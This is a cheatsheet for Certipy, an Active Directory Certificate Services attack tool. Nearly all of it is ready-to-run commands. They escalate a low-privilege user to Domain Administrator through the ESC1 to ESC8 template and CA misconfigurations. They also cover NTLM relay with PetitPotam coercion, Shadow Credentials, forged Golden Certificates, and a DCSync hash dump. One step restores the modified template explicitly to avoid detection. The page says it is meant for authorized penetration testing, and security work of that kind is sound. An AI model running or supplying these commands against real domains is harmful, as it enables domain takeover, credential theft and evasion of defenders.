# 🏛️ Certipy - Complete Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)

```
   ██████╗███████╗██████╗ ████████╗██╗██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗╚══██╔══╝██║██╔══██╗╚██╗ ██╔╝
  ██║     █████╗  ██████╔╝   ██║   ██║██████╔╝ ╚████╔╝ 
  ██║     ██╔══╝  ██╔══██╗   ██║   ██║██╔═══╝   ╚██╔╝  
  ╚██████╗███████╗██║  ██║   ██║   ██║██║        ██║   
   ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝        ╚═╝   
       Active Directory Certificate Services (AD CS) Abuse
```

<p align="center">
  <img src="https://img.shields.io/badge/Certipy-AD_CS_Abuse-blue?style=for-the-badge" alt="Certipy">
  <img src="https://img.shields.io/badge/ESC1_to_ESC15-Vulnerabilities-red?style=for-the-badge" alt="ESC1-ESC15">
  <img src="https://img.shields.io/badge/PKINIT-Kerberos_Auth-orange?style=for-the-badge" alt="PKINIT">
  <img src="https://img.shields.io/badge/Active_Directory-Privilege_Escalation-green?style=for-the-badge" alt="AD PrivEsc">
</p>

<p align="center">
  <b>🔑 Comprehensive tool for enumerating and exploiting Active Directory Certificate Services (AD CS) misconfigurations</b>
</p>

---

## 📋 Table of Contents

- [Introduction](#-introduction)
- [Why AD CS Abuse?](#-why-ad-cs-abuse)
- [Installation](#-installation)
- [Certipy Subcommands Overview](#-certipy-subcommands-overview)
- [Enumeration & Discovery (`find`)](#-enumeration--discovery-find)
- [The ESC Vulnerability Matrix](#-the-esc-vulnerability-matrix)
  - [ESC1: Enrollee Supplies Subject Alt Name (SAN)](#esc1-enrollee-supplies-subject-alt-name-san)
  - [ESC2: Any Purpose EKU or SubCA](#esc2-any-purpose-eku-or-subca)
  - [ESC3: Certificate Request Agent](#esc3-certificate-request-agent)
  - [ESC4: Vulnerable Template Access Control (ACL)](#esc4-vulnerable-template-access-control-acl)
  - [ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Enabled](#esc6-editf_attributesubjectaltname2-enabled)
  - [ESC7: Vulnerable CA Access Control](#esc7-vulnerable-ca-access-control)
  - [ESC8: NTLM Relay to HTTP Web Enrollment](#esc8-ntlm-relay-to-http-web-enrollment)
  - [ESC9 & ESC10: Strong Certificate Mapping Flaws](#esc9--esc10-strong-certificate-mapping-flaws)
- [Shadow Credentials (`shadow`)](#-shadow-credentials-shadow)
- [Golden Certificates (`forge`)](#-golden-certificates-forge)
- [Authenticating with PFX (`auth`)](#-authenticating-with-pfx-auth)
- [Real-World Attack Workflows](#-real-world-attack-workflows)
- [Quick Reference Table](#-quick-reference-table)
- [Tips & Best Practices](#-tips--best-practices)
- [Legal Disclaimer](#-legal-disclaimer)
- [Resources](#-resources)

---

## 🎯 Introduction

**Certipy** (created by Oliver Lyak) is the premier Python-based tool for enumerating and exploiting Active Directory Certificate Services (**AD CS**). AD CS is Microsoft’s Public Key Infrastructure (PKI) implementation for enterprise Active Directory networks, widely used for smart card logon, VPNs, S/MIME, and internal TLS encryption.

Because certificate misconfigurations frequently allow unprivileged domain users to request certificates as Domain Admins or Domain Controllers, AD CS abuse represents one of the most reliable and impactful domain escalation vectors in modern enterprise penetration tests.

---

## ⚖️ Why AD CS Abuse?

- ⚡ **Instant Domain Escalation:** Misconfigured certificate templates often grant domain-wide compromise in seconds.
- 🔑 **Stealthy & Persistent:** Stolen certificates or forged Golden Certificates can remain valid for years without triggering standard password change alerts.
- 🔄 **PKINIT to NT Hash:** Certipy authenticates requested `.pfx` certificates over Kerberos PKINIT, retrieving the target's plaintext NT hash directly from the KDC.

---

## 📥 Installation

### Using pipx (Recommended)

```bash
pipx install certipy-ad
```

### From GitHub Repository

```bash
git clone https://github.com/ly4k/Certipy.git
cd Certipy
pip install .
```

### Verification

```bash
certipy -h
```

---

## 🧭 Certipy Subcommands Overview

| Subcommand | Function |
|------------|----------|
| `find` | Enumerate CAs, templates, and detect ESC vulnerabilities |
| `req` | Request certificates from vulnerable templates |
| `auth` | Authenticate using `.pfx` certificates to retrieve TGT and NT hash |
| `ca` | Enumerate and modify CA configuration settings |
| `template` | Modify certificate template settings (useful in ESC4) |
| `account` | Manage Active Directory computer accounts (MachineAccountQuota) |
| `shadow` | Exploit Shadow Credentials (`msDS-KeyCredentialLink`) |
| `forge` | Forge Golden Certificates using a stolen CA private key |

---

## 🔍 Enumeration & Discovery (`find`)

Start by identifying the Enterprise Certificate Authority (CA) and scanning for vulnerable templates:

```bash
# Enumerate all CAs and templates with standard credentials
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1

# Print vulnerable templates directly to terminal
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -vulnerable -stdout

# Output results formatted for BloodHound
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -bloodhound
```

---

## 💥 The ESC Vulnerability Matrix

### ESC1: Enrollee Supplies Subject Alt Name (SAN)

**Condition:**
- Low-privileged users have enrollment rights (`Client Authentication` EKU enabled).
- Template specifies `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (allows requester to specify any Subject Alternative Name, such as the Domain Administrator).

**Exploitation:**
```bash
# 1. Request certificate on behalf of Domain Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'VulnerableTemplate' \
  -upn 'administrator@corp.local' \
  -dc-ip 10.10.10.1

# 2. Authenticate with resulting administrator.pfx via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
*Output yields Administrator's TGT and plaintext NT Hash!*

---

### ESC2: Any Purpose EKU or SubCA

**Condition:**
- Template specifies `Any Purpose` EKU or has no EKU defined.
- Can be used for any purpose, including client authentication.

**Exploitation:**
Exploited identically to ESC1 or used in combination with ESC3 to obtain an enrollment agent certificate.

---

### ESC3: Certificate Request Agent

**Condition:**
- Template has the `Certificate Request Agent` EKU (Enrollment Agent).
- Allows requesting certificates on behalf of another user across secondary templates.

**Exploitation:**
```bash
# 1. Request Enrollment Agent certificate
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'AgentTemplate' -dc-ip 10.10.10.1

# 2. Use the agent certificate to request on behalf of Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'UserTemplate' \
  -on-behalf-of 'CORP\administrator' \
  -pfx john.pfx -dc-ip 10.10.10.1

# 3. Authenticate with the obtained Administrator PFX
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

---

### ESC4: Vulnerable Template Access Control (ACL)

**Condition:**
- Low-privilege user has `WriteOwner`, `WriteDacl`, or `WriteProperty` rights over a certificate template.

**Exploitation:**
```bash
# 1. Overwrite template configuration to make it vulnerable to ESC1
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -save-old \
  -dc-ip 10.10.10.1

# 2. Request certificate as Administrator (ESC1)
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'TargetTemplate' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1

# 3. Restore original template configuration to avoid detection
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -configuration TargetTemplate.json -dc-ip 10.10.10.1
```

---

### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Enabled

**Condition:**
- The CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set, allowing any certificate request to specify arbitrary SANs regardless of template settings!

**Exploitation:**
```bash
# Request certificate as Administrator using any template allowing Client Auth (e.g. default 'User')
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'User' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1
```

---

### ESC7: Vulnerable CA Access Control

**Condition:**
- User has `ManageCA` or `ManageCertificates` rights on the CA itself.

**Exploitation:**
```bash
# 1. Add yourself as Officer on the CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -add-officer 'john.doe' -dc-ip 10.10.10.1

# 2. Enable vulnerable template on CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -enable-template 'SubCA' -dc-ip 10.10.10.1

# 3. Issue and retrieve previously denied request
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -issue-request <REQUEST_ID> -dc-ip 10.10.10.1
```

---

### ESC8: NTLM Relay to HTTP Web Enrollment

**Condition:**
- The CA has the Web Enrollment HTTP endpoint (`/certsrv/`) enabled with NTLM authentication without EPA (Extended Protection for Authentication) and HTTPS.

**Exploitation Workflow:**
1. Start `ntlmrelayx` pointing to CA Web Enrollment:
   ```bash
   impacket-ntlmrelayx -t http://10.10.10.50/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
   ```
2. Trigger coerced machine authentication via PetitPotam or PrinterBug:
   ```bash
   python3 petitpotam.py 192.168.1.100 10.10.10.1
   ```
3. `ntlmrelayx` relays the DC's machine account NTLM auth, requests a computer certificate, and outputs base64 `.pfx`.
4. Authenticate as the Domain Controller using Certipy:
   ```bash
   certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1
   ```
5. Use the DC's NT hash to perform a full DCSync dump with `impacket-secretsdump`.

---

## 👥 Shadow Credentials (`shadow`)

If a compromised account has write access over another account's `msDS-KeyCredentialLink` attribute:

```bash
# Automatically write key credential, authenticate via PKINIT, and recover target NT hash
certipy shadow auto -u 'john.doe@corp.local' -p 'P@ssword123' \
  -account 'TARGET_USER' \
  -dc-ip 10.10.10.1
```

---

## 👑 Golden Certificates (`forge`)

If you have compromised the CA and extracted its private key:

```bash
# Forge a Golden Certificate valid for any user without contacting the CA
certipy forge -ca-pfx ca_private.pfx \
  -upn 'administrator@corp.local' \
  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'

# Authenticate with the forged certificate
certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.10.1
```

---

## 🔑 Authenticating with PFX (`auth`)

```bash
# Retrieve TGT and NT hash via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Save TGT to ccache for Kerberos ticketing
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -ldap-shell
```

---

## 🎬 Real-World Attack Workflows

### Complete ESC1 Domain Takeover in 3 Commands

```bash
# Step 1: Discover ESC1 template
certipy find -u 'alice@domain.local' -p 'Summer2026!' -dc-ip 10.10.10.1 -vulnerable -stdout

# Step 2: Request certificate as Administrator
certipy req -u 'alice@domain.local' -p 'Summer2026!' \
  -ca 'Domain-CA' \
  -template 'SmartCardUser' \
  -upn 'administrator@domain.local' \
  -dc-ip 10.10.10.1

# Step 3: Extract NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Step 4: Full DCSync dump
impacket-secretsdump -hashes :<EXTRACTED_NT_HASH> 'domain.local/administrator@10.10.10.1'
```

---

## 📊 Quick Reference Table

| Task | Command |
|------|---------|
| **Enumerate AD CS** | `certipy find -u u@d -p p -dc-ip <IP> -vulnerable -stdout` |
| **Request Cert (ESC1)** | `certipy req -u u@d -p p -ca <CA> -template <T> -upn admin@d -dc-ip <IP>` |
| **Authenticate PFX** | `certipy auth -pfx <file>.pfx -dc-ip <IP>` |
| **Modify Template (ESC4)**| `certipy template -u u@d -p p -template <T> -save-old -dc-ip <IP>` |
| **Shadow Credentials** | `certipy shadow auto -u u@d -p p -account <TARGET> -dc-ip <IP>` |
| **Manage CA Rights** | `certipy ca -u u@d -p p -ca <CA> -add-officer <u> -dc-ip <IP>` |
| **Forge Golden Cert** | `certipy forge -ca-pfx ca.pfx -upn admin@d -subject <DN>` |

---

## 💡 Tips & Best Practices

1. **Check DC Clock Sync:**
   Kerberos PKINIT requires your system time to be synchronized within 5 minutes of the Domain Controller. Run:
   ```bash
   sudo rdate -n 10.10.10.1
   # or
   sudo ntpdate 10.10.10.1
   ```
2. **Handle KDC_ERR_PADATA_TYPE_NOSUPP:**
   If `certipy auth` fails with this error, the Domain Controller does not have a valid Domain Controller certificate installed for PKINIT. In this case, use LDAP or SChannel authentication.
3. **Always Clean Up ESC4 Templates:**
   When altering certificate templates, always retain and re-apply the backup configuration (`-configuration <FILE>.json`) to avoid leaving the environment vulnerable or causing operational outages.

---

## ⚠️ Legal Disclaimer

> **IMPORTANT:** Active Directory Certificate Services attacks grant critical, high-impact administrative access across domain networks. Certipy must only be executed during authorized penetration tests, red team exercises, and ethical security audits with written permission.

---

## 📚 Resources

- [Certipy Official GitHub Repository](https://github.com/ly4k/Certipy)
- [Certified Pre-Owned Whitepaper (SpecterOps)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [AD CS Attack Paths & Protections (Oliver Lyak)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
